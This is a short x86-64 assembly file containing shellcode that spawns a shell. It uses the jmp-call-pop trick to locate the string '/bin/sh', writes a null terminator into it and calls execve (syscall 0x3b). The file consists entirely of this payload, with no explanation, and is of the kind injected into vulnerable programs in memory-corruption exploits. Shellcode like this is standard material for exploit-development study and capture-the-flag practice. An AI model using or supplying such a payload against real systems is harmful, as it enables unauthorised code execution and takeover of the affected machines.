BITS 64
jmp there
here:
pop	rdi
xor	rax, rax
mov byte [rdi + 7], al
mov byte	al, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
there: call here
.string db '/bin/sh'
	db 0x00
